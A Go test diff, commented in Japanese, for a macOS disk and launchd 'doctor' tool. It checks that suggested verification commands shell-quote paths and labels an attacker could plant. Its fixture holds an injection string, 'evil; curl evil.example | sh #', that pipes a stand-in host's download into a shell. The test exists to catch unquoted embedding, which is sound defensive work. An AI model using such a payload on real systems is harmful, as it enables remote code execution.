@@ -1819,3 +1819,80 @@ func TestDoctorDiskRowKeepsStateAtNarrowWidth(t *testing.T) {
 
 // doctorRiskMarkText はテスト用に記号だけを取り出す。
 func doctorRiskMarkText(r disk.Result) string { m, _ := doctorRiskMark(r); return m }
+
+// Y のコピー文に「なぜ出たか」を確かめるコマンドを載せる (issue 183)。
+//
+// 🚨 パス / Label は必ず svc.ShellQuote を通す。どちらも攻撃者が置ける値で、引用しないと
+// **doctor 自身が提示するコマンドがインジェクションを運ぶ** (issue 178 / 193 が塞いだ穴を
+// 新設することになる)。
+func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
+	const evil = `evil; curl evil.example | sh #`
+
+	// (1) disk: ID ごとにコマンドが変わる。既存出力と重複するものは載せない
+	for id, want := range map[string]string{
+		"simulator-runtimes":         "xcrun simctl runtime list -j",
+		"coresimulator-orphan":       "xcrun simctl list devices -j",
+		"orphan-container":           "ls /Applications ~/Applications",
+		"brew-orphan-state":          "brew list --formula",
+		"versionmanager-orphan-root": "rbenv root",
+		"xctest-logarchive":          "sysctl kern.boottime",
+	} {
+		r := disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: disk.StatusOK}
+		got := diskCopyText(r, "✅ 安全")
+		if !strings.Contains(got, want) {
+			t.Errorf("%s のコピー文に %q が無い:\n%s", id, want, got)
+		}
+	}
+
+	// 🚨 mdfind は出さない (カタログが「使わない」と明記した判定材料。issue 148)
+	if got := diskCopyText(disk.Result{Entry: disk.Entry{ID: "orphan-container"}}, "⛔"); strings.Contains(got, "mdfind") {
+		t.Errorf("否定された判定材料 (mdfind) をコピー文に出した:\n%s", got)
+	}
+
+	// 既存出力と重複するコマンドを足していないこと (Item のサイズと最終更新は既に出ている)
+	npm := disk.Result{Entry: disk.Entry{ID: "npm-cache"}, Status: disk.StatusOK,
+		Items: []disk.Item{{Path: "/h/.npm", Size: 100}}}
+	if got := diskCopyText(npm, "✅"); strings.Contains(got, "du -sk") || strings.Contains(got, "stat -f") {
+		t.Errorf("既存出力と重複するコマンドを足した:\n%s", got)
+	}
+
+	// (2) disk: Inspect 系はパスごとに ls を出し、**引用する**
+	drag := disk.Result{Entry: disk.Entry{ID: "swiftui-drag-cache"}, Status: disk.StatusOK,
+		Items: []disk.Item{{Path: "/tmp/" + evil, Size: 1}}}
+	got := diskCopyText(drag, "⛔ 要確認")
+	if !strings.Contains(got, "ls -la ") {
+		t.Errorf("Inspect 系に ls が無い:\n%s", got)
+	}
+	if strings.Contains(got, "ls -la /tmp/"+evil) {
+		t.Errorf("パスを引用せずにコマンドへ埋めた (インジェクション):\n%s", got)
+	}
+
+	// Items が多くても上限で切る (コピー文が読めない長さにならない)
+	many := disk.Result{Entry: disk.Entry{ID: "finder-nsird"}, Status: disk.StatusOK}
+	for i := range 20 {
+		many.Items = append(many.Items, disk.Item{Path: fmt.Sprintf("/tmp/x%d", i), Size: 1})
+	}
+	if n := strings.Count(diskCopyText(many, "⛔"), "ls -la "); n > maxVerifyCommands {
+		t.Errorf("裏取りコマンドが上限 %d を超えた: %d 本", maxVerifyCommands, n)
+	}
+
+	// (3) svc: 読み取りと破壊を見出しで分ける
+	f := svc.Finding{Label: evil, PlistPath: "/L/" + evil + ".plist", Domain: "system",
+		MissingExec: "/nowhere/" + evil, HasLastExit: true, LastExit: 1, BrewFormula: "mysql@8.0",
+		Commands: []string{"sudo launchctl bootout system/x"}}
+	sv := svcCopyText(f)
+	for _, want := range []string{"自分で確かめるコマンド (読み取りのみ)", "消すと決めたら手動で実行",
+		"plutil -p ", "launchctl print ", "ls -l ", "brew list --formula"} {
+		if !strings.Contains(sv, want) {
+			t.Errorf("svc のコピー文に %q が無い:\n%s", want, sv)
+		}
+	}
+	// 🚨 Label / パスが引用されていること。素で出ると `;` 以降が別コマンドになる
+	if strings.Contains(sv, "launchctl print system/"+evil) {
+		t.Errorf("Label を引用せずにコマンドへ埋めた (インジェクション):\n%s", sv)
+	}
+	// 🚨 ドメインは f.Domain を使う (gui/ 決め打ちだと system の登録で誤ったコマンドを渡す)
+	if strings.Contains(sv, "gui/") {
+		t.Errorf("system ドメインなのに gui/ を決め打ちしている:\n%s", sv)
+	}
+}
